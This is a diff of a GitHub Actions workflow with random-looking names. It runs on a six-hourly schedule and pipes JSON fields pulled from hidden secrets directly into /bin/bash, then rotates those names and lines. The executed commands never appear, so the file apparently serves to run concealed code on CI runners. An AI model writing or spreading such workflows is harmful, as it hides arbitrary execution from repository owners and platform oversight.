@@ -1,24 +1,24 @@
 name: nijiuhen6152
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '1 5/6 * * *'
+    - cron: '4 0/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: nijiuhen6152
         env:
-          ior7165: ${{ secrets.ior7165 }}
+          gvxo6328: ${{ secrets.gvxo6328 }}
         run: |
-          echo $ior7165 | jq -r .rmih2454 | /bin/bash
-          echo $dgkr003 | jq -r .t308 | /bin/bash
-          echo $y26 | jq -r .vs60 | /bin/bash
-          echo $i897 | jq -r .srdfh6076 | /bin/bash
-          echo $cz6949 | jq -r .qlvnv6034 | /bin/bash
-          echo $mxcvc11 | jq -r .ft6 | /bin/bash
-          echo $gv8052 | jq -r .q5607 | /bin/bash
-          echo $ea219 | jq -r .cts5 | /bin/bash
-          echo $xys665 | jq -r .mjjy6133 | /bin/bash
+          echo $gvxo6328 | jq -r .iqh89696 | /bin/bash
+          echo $jqtq3195 | jq -r .pw894 | /bin/bash
+          echo $bqrvs52741 | jq -r .p1194 | /bin/bash
+          echo $zrc3142 | jq -r .oom63721 | /bin/bash
+          echo $f58660 | jq -r .c1 | /bin/bash
+          echo $b29 | jq -r .oqk0370 | /bin/bash
 
